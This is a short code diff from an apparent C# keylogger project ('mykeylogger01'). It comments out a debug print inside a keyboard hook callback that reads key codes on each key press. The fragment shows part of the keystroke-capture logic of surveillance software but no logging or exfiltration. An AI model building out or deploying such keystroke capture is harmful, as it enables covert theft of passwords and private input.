@@ -29,7 +29,7 @@ namespace mykeylogger01
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                Console.Out.WriteLine(lParam);
+                //Console.Out.WriteLine(lParam);
 
                 int vkCode = Marshal.ReadInt32(lParam);
                 if(((Keys)vkCode).ToString() == "OemPeriod")
